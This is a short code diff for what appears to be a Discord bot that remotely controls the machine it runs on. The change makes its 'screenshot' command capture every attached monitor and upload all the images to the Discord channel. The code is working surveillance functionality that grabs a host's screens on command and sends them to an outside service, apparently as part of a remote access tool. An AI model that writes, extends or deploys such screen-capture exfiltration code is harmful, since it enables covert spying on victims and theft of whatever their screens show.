@@ -430,13 +430,27 @@ async def msg(ctx, *, text: str):
 async def screenshot(ctx):
     try:
         with mss.mss() as sct:
-            monitor = sct.monitors[1]
-            sct_img = sct.grab(monitor)
-            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-            buffer = io.BytesIO()
-            img.save(buffer, format="PNG")
-            buffer.seek(0)
-            await ctx.send(file=discord.File(buffer, filename="screenshot.png"))
+            files = []
+
+            for i, monitor in enumerate(sct.monitors[1:], start=1):  # skip the "all" monitor
+                sct_img = sct.grab(monitor)
+                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+
+                buffer = io.BytesIO()
+                img.save(buffer, format="PNG")
+                buffer.seek(0)
+
+                files.append(discord.File(buffer, filename=f"screenshot_monitor_{i}.png"))
+
+            if not files:
+                await ctx.send("No monitors found.")
+                return
+
+            await ctx.send(
+                content=f"Captured {len(files)} monitor(s):",
+                files=files
+            )
+
     except Exception as e:
         await ctx.send(f"Screenshot failed: {e}")
 
